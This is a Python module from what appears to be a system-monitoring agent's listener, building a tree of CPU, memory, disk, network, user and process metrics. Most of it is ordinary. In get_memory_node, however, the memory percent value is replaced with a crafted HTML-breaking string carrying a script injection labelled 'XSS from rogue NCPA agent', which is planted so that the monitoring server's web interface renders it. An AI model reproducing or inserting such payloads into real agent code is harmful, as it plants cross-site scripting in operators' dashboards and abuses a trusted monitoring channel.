# -*- coding: utf-8 -*-
import psutil as ps
import os
import logging
import datetime
import time
import re
import platform
import server
import urllib
from nodes import ParentNode, RunnableNode, RunnableParentNode, LazyNode
from pluginnodes import PluginAgentNode
import services
import processes
import environment
import math

importables = (
    'windowscounters',
    'windowslogs'
)

def get_uptime():
    current_time = time.time()
    epoch_boot = int(current_time)
    return (epoch_boot - ps.boot_time(), 's')

def make_disk_nodes(disk_name):
    read_time = RunnableNode('read_time', method=lambda: (ps.disk_io_counters(perdisk=True)[disk_name].read_time, 'ms'))
    write_time = RunnableNode('write_time',
                              method=lambda: (ps.disk_io_counters(perdisk=True)[disk_name].write_time, 'ms'))
    read_count = RunnableNode('read_count',
                              method=lambda: (ps.disk_io_counters(perdisk=True)[disk_name].read_count, 'c'))
    write_count = RunnableNode('write_count',
                               method=lambda: (ps.disk_io_counters(perdisk=True)[disk_name].write_count, 'c'))
    read_bytes = RunnableNode('read_bytes',
                              method=lambda: (ps.disk_io_counters(perdisk=True)[disk_name].read_bytes, 'B'))
    write_bytes = RunnableNode('write_bytes',
                               method=lambda: (ps.disk_io_counters(perdisk=True)[disk_name].write_bytes, 'B'))
    return ParentNode(disk_name, children=[read_time, write_time, read_count, write_count, read_bytes, write_bytes])


def make_mountpoint_nodes(partition_name):
    mountpoint = partition_name.mountpoint

    total = RunnableNode('total', method=lambda: (ps.disk_usage(mountpoint).total, 'B'))
    used = RunnableNode('used', method=lambda: (ps.disk_usage(mountpoint).used, 'B'))
    free = RunnableNode('free', method=lambda: (ps.disk_usage(mountpoint).free, 'B'))
    used_percent = RunnableNode('used_percent', method=lambda: (ps.disk_usage(mountpoint).percent, '%'))
    device_name = RunnableNode('device_name', method=lambda: ([partition_name.device], ''))
    fstype = RunnableNode('fstype', method=lambda: (partition_name.fstype, ''))
    opts = RunnableNode('opts', method=lambda: (partition_name.opts, ''))
    safe_mountpoint = re.sub(r'[\\/]+', '|', mountpoint)

    node_children = [total, used, free, used_percent, device_name, fstype, opts]

    # Unix specific inode counter ~ sorry Windows! :'(
    if environment.SYSTEM != 'Windows':
        try:
            st = os.statvfs(mountpoint)
            iu = st.f_files - st.f_ffree
            iup = 0
            if iu > 0:
                iup = math.ceil(100 * float(iu) / float(st.f_files))
            inodes = RunnableNode('inodes', method=lambda: (st.f_files, 'inodes'))
            inodes_used = RunnableNode('inodes_used', method=lambda: (iu, 'inodes'))
            inodes_free = RunnableNode('inodes_free', method=lambda: (st.f_ffree, 'inodes'))
            inodes_used_percent = RunnableNode('inodes_used_percent', method=lambda: (iup, '%'))
            node_children.append(inodes)
            node_children.append(inodes_used)
            node_children.append(inodes_free)
            node_children.append(inodes_used_percent)
        except OSError as ex:
            # Log this error as debug only, normally means could not count inodes because
            # of some permissions or access related issues
            logging.exception(ex)

    # Make and return the full parent node
    return RunnableParentNode(safe_mountpoint,
                              children=node_children,
                              primary='used_percent', primary_unit='%',
                              custom_output='Used disk space was',
                              include=('total', 'used', 'free', 'used_percent'))

def make_mount_other_nodes(partition):
    dvn = RunnableNode('device_name', method=lambda: ([partition.device], ''))
    fstype = RunnableNode('fstype', method=lambda: (partition.fstype, ''))
    opts = RunnableNode('opts', method=lambda: (partition.opts, ''))
    safe_mountpoint = re.sub(r'[\\/]+', '|', partition.mountpoint)
    return ParentNode(safe_mountpoint, children=[dvn, fstype, opts])

def make_if_nodes(if_name):
    x = ps.net_io_counters(pernic=True)

    bytes_sent = RunnableNode('bytes_sent', method=lambda: (x[if_name].bytes_sent, 'B'))
    bytes_recv = RunnableNode('bytes_recv', method=lambda: (x[if_name].bytes_recv, 'B'))
    packets_sent = RunnableNode('packets_sent', method=lambda: (x[if_name].packets_sent, 'packets'))
    packets_recv = RunnableNode('packets_recv', method=lambda: (x[if_name].packets_recv, 'packets'))
    errin = RunnableNode('errin', method=lambda: (x[if_name].errin, 'errors'))
    errout = RunnableNode('errout', method=lambda: (x[if_name].errout, 'errors'))
    dropin = RunnableNode('dropin', method=lambda: (x[if_name].dropin, 'packets'))
    dropout = RunnableNode('dropout', method=lambda: (x[if_name].dropout, 'packets'))

    # Temporary fix for Windows (latin-1 should catch most things)
    name = if_name
    if environment.SYSTEM == "Windows":
        name = unicode(if_name, "latin-1", errors="replace")

    return RunnableParentNode(name, primary='bytes_sent', children=[bytes_sent, bytes_recv, packets_sent,
                              packets_recv, errin, errout, dropin, dropout])


def get_timezone():
    zones = time.tzname
    if environment.SYSTEM == "Windows":
        zones = [unicode(x, "latin-1", errors="replace") for x in zones]
    return zones, ''


def get_system_node():
    sys_system = RunnableNode('system', method=lambda: (platform.uname()[0], ''))
    sys_node = RunnableNode('node', method=lambda: (platform.uname()[1], ''))
    sys_release = RunnableNode('release', method=lambda: (platform.uname()[2], ''))
    sys_version = RunnableNode('version', method=lambda: (platform.uname()[3], ''))
    sys_machine = RunnableNode('machine', method=lambda: (platform.uname()[4], ''))
    sys_processor = RunnableNode('processor', method=lambda: (platform.uname()[5], ''))
    sys_uptime = RunnableNode('uptime', method=get_uptime)
    sys_agent = RunnableNode('agent_version', method=lambda: (server.__VERSION__, ''))
    sys_time = RunnableNode('time', method=lambda: (time.time(), ''))
    sys_timezone = RunnableNode('timezone', method=get_timezone)
    return ParentNode('system', children=[sys_system, sys_node, sys_release, sys_version,
                      sys_machine, sys_processor, sys_uptime, sys_agent, sys_timezone, sys_time])


def get_cpu_node():
    cpu_count = RunnableNode('count', method=lambda: ([len(ps.cpu_percent(percpu=True))], 'cores'))
    cpu_percent = LazyNode('percent', method=lambda: (ps.cpu_percent(interval=0.5, percpu=True), '%'))
    cpu_user = RunnableNode('user', method=lambda: ([x.user for x in ps.cpu_times(percpu=True)], 'ms'))
    cpu_system = RunnableNode('system', method=lambda: ([x.system for x in ps.cpu_times(percpu=True)], 'ms'))
    cpu_idle = RunnableNode('idle', method=lambda: ([x.idle for x in ps.cpu_times(percpu=True)], 'ms'))
    return ParentNode('cpu', children=[cpu_count, cpu_system, cpu_percent, cpu_user, cpu_idle])


def get_memory_node():
    mem_virt_total = RunnableNode('total', method=lambda: (ps.virtual_memory().total, 'B'))
    mem_virt_available = RunnableNode('available', method=lambda: (ps.virtual_memory().available, 'B'))
    # HACK: return a payload here instead of a boring old percent
    xss_payload = '<script>alert("XSS from rogue NCPA agent");</script>'
    injected_html_string = '52.1" class="form-control condensed">%s</span fakeattr="' % xss_payload
    mem_virt_percent = RunnableNode('percent', method=lambda: (injected_html_string, '%'))
    #mem_virt_percent = RunnableNode('percent', method=lambda: (ps.virtual_memory().percent, '%'))
    mem_virt_used = RunnableNode('used', method=lambda: (ps.virtual_memory().used, 'B'))
    mem_virt_free = RunnableNode('free', method=lambda: (ps.virtual_memory().free, 'B'))
    mem_virt = RunnableParentNode('virtual', primary='percent', primary_unit='%',
                    children=(mem_virt_total, mem_virt_available, mem_virt_free,
                              mem_virt_percent, mem_virt_used),
                    custom_output='Memory usage was')
    mem_swap_total = RunnableNode('total', method=lambda: (ps.swap_memory().total, 'B'))
    mem_swap_percent = RunnableNode('percent', method=lambda: (ps.swap_memory().percent, '%'))
    mem_swap_used = RunnableNode('used', method=lambda: (ps.swap_memory().used, 'B'))
    mem_swap_free = RunnableNode('free', method=lambda: (ps.swap_memory().free, 'B'))
    node_children = [mem_swap_total, mem_swap_free, mem_swap_percent, mem_swap_used]

    # sin and sout on Windows are always set to 0 ~ sorry Windows! :'(
    if environment.SYSTEM != 'Windows':
        mem_swap_in = RunnableNode('swapped_in', method=lambda: (ps.swap_memory().sin, 'B'))
        mem_swap_out = RunnableNode('swapped_out', method=lambda: (ps.swap_memory().sout, 'B'))
        node_children.append(mem_swap_in)
        node_children.append(mem_swap_out)

    mem_swap = RunnableParentNode('swap',
                    children=node_children,
                    primary='percent', primary_unit='%',
                    custom_output='Swap usage was',
                    include=('total', 'used', 'free', 'percent'))
    return ParentNode('memory', children=[mem_virt, mem_swap])


def get_disk_node(config):
    # Get all physical disk io counters
    try:
        disk_counters = [make_disk_nodes(x) for x in list(ps.disk_io_counters(perdisk=True).keys())]
    except IOError as ex:
        logging.exception(ex)
        disk_counters = []

    # Get exclude values from the config
    try:
        exclude_fs_types = config.get('general', 'exclude_fs_types')
    except Exception as e:
        exclude_fs_types = "aufs,autofs,binfmt_misc,cifs,cgroup,debugfs,devpts,devtmpfs,"\
                           "encryptfs,efivarfs,fuse,hugelbtfs,mqueue,nfs,overlayfs,proc,"\
                           "pstore,rpc_pipefs,securityfs,smb,sysfs,tmpfs,tracefs,xenfs"
    exclude_fs_types = [x.strip() for x in exclude_fs_types.split(',')]

    # Get the all partitions value
    try:
        all_partitions = bool(config.get('general', 'all_partitions'))
    except Exception as e:
        all_partitions = True

    disk_mountpoints = []
    disk_parts = []
    try:
        for x in ps.disk_partitions(all=all_partitions):

            # to check against fuse.<type> etc
            fstype = x.fstype
            if x.fstype is not None:
                fstype = x.fstype.split('.')[0]

            if fstype not in exclude_fs_types:
                if os.path.isdir(x.mountpoint):
                    try:
                        tmp = make_mountpoint_nodes(x)
                        disk_mountpoints.append(tmp)
                    except OSError as ex:
                        logging.exception(ex)
                else:
                    tmp = make_mount_other_nodes(x)
                    disk_parts.append(tmp)
    except IOError as ex:
        logging.exception(ex)

    disk_logical = ParentNode('logical', children=disk_mountpoints)
    disk_physical = ParentNode('physical', children=disk_counters)
    disk_mount = ParentNode('mount', children=disk_parts)

    return ParentNode('disk', children=[disk_physical, disk_logical, disk_mount])


def get_interface_node():
    if_children = [make_if_nodes(x) for x in list(ps.net_io_counters(pernic=True).keys())]
    return ParentNode('interface', children=if_children)


def get_plugins_node():
    return PluginAgentNode('plugins')


def get_user_node():
    user_count = RunnableNode('count', method=lambda: (len([x.name for x in ps.users()]), 'users'))
    user_list = RunnableNode('list', method=lambda: ([x.name for x in ps.users()], 'users'))
    return ParentNode('user', children=[user_count, user_list])


def get_root_node(config):
    try:
        cpu = get_cpu_node()
    except Exception as e:
        cpu = ParentNode('N/A')
        logging.exception(e)

    try:
        memory = get_memory_node()
    except Exception as e:
        memory = ParentNode('N/A')
        logging.exception(e)

    try:
        disk = get_disk_node(config)
    except Exception as e:
        disk = ParentNode('N/A')
        logging.exception(e)

    try:
        interface = get_interface_node()
    except Exception as e:
        interface = ParentNode('N/A')
        logging.exception(e)

    try:
        plugins = get_plugins_node()
    except Exception as e:
        plugins = ParentNode('N/A')
        logging.exception(e)

    try:
        user = get_user_node()
    except Exception as e:
        user = ParentNode('N/A')
        logging.exception(e)

    try:
        system = get_system_node()
    except Exception as e:
        system = ParentNode('N/A')
        logging.exception(e)

    try:
        service = services.get_node()
    except Exception as e:
        service = ParentNode('N/A')
        logging.exception(e)

    try:
        process = processes.get_node()
    except Exception as e:
        process = ParentNode('N/A')
        logging.exception(e)

    children = [cpu, memory, disk, interface, plugins, user, system, service, process]

    if environment.SYSTEM == "Windows":
        for importable in importables:
            try:
                relative_name = 'listener.' + importable
                tmp = __import__(relative_name, fromlist=['get_node'])
                get_node = getattr(tmp, 'get_node')

                try:
                    node = get_node()
                except Exception as e:
                    node = ParentNode('N/A')
                    logging.exception(e)
                children.append(node)
                logging.debug("Imported %s into the API tree.", importable)
            except ImportError:
                logging.warning("Could not import %s, skipping.", importable)
            except AttributeError:
                logging.warning("Trying to import %s but does not get_node() function, skipping.", importable)

    return ParentNode('root', children=children)


def refresh(config):
    global root
    root = get_root_node(config)
    return True


def getter(accessor, config, full_path, args, cache=False):
    global root

    # Sanity check. If accessor is None, we can do nothing meaningfully, and we need to stop.
    if accessor is None:
        return

    # Split the accessor path on / (but not if they are inside " or ')
    pattern = re.compile(r'''((?:[^/"']|"[^"]*"|'[^']*')+)''')
    path = pattern.split(accessor)[1::2]

    # Check if this should be a cached query or if we should reset the root
    # node. This normally only happens on new API calls. When we are using
    # websockets we use the cached version while it makes requests.
    if not cache:
        refresh(config)

    root.reset_valid_nodes()
    return root.accessor(path, config, full_path, args)
